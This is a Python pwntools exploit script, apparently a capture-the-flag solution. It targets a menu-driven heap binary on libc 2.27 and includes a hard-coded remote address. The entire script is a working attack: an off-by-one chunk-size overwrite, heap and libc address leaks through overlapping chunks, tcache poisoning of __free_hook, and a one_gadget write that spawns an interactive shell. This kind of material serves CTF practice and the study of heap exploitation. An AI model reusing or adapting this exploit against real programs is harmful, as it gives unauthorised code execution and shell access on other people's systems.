from pwn import *

context(arch='amd64', os='linux')

file_name = './z1r0'

debug = 0
if debug:
    r = remote('121.36.194.21', 49153)
else:
    r = process(file_name)

elf = ELF(file_name)

libc = ELF('libc-2.27.so')

menu = 'Your choice: '

def dbg():
    gdb.attach(r)

def create(index, size):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))


create(0, 0x48)
create(1, 0x20)
create(2, 0x30)
create(3, 0x30)

edit(0, 0x48 * b'a'+p8(0x51))

delete(1)

delete(3)

delete(2)

create(1, 0x48)

edit(1, b'a' * 0x30 + b'\n')

show(1)


r.recvuntil('a' * 0x30)

re = u64(r.recv(6).ljust(8, b'\x00'))
success('re = ' + hex(re))
heap_addr = re - 0x555711a7c30a + 0x555711a7c000
success('heap_addr = ' + hex(heap_addr))


edit(1, b'b' * 0x20 + p64(0) + p64(0x41) + p64(re + 22) + b'\n')

create(4,0x28)
create(5, 0x40)
create(6, 0x50)

for i in range(13):
    create(i + 7, 0x50)

create(0x1f, 0x28)
create(0x1e, 0x20)
create(0x1d, 0x30)
create(0x1c, 0x30)
create(0x1b, 0x30)

delete(0x1d)
delete(0x1c)
delete(0x1b)


edit(6, p64(0) + p64(0x551 - 0x80) + b'\n')

edit(0x1f, 0x28 * b'c' + p8(0x61))

delete(0x1e)

create(0x1e, 0x50)

edit(0x1e, 0x28 * b'd' + p64(0x41) + p64(heap_addr + 0x3f0) + b'\n')

create(0x1b, 0x30)
create(0x1c, 0x30)

delete(0x1c)

edit(6, 0xf * b'x' + b'\n')

show(6)

re2 = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
success('re2 = ' + hex(re2))


libc_base = re2 - 0x7ff81693aca0 + 0x7ff81654f000

#libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x3ebca0
success('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
success('free_hook = ' + hex(free_hook))
one = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = one[1] + libc_base


edit(6, p64(0) + p64(0x4d1) + p64(re2) * 2 + p64(free_hook) + b'\n')

create(0x15, 0x10)
delete(7)

create(0x16, 0x40)
edit(0x16, b'a' * 0x20 + p64(0) + p64(0x61) + p64(free_hook) + b'\n')

create(0x17, 0x50)
create(0x18, 0x50)

edit(0x18, p64(one_gadget) + b'\n')

delete(0)





r.interactive()
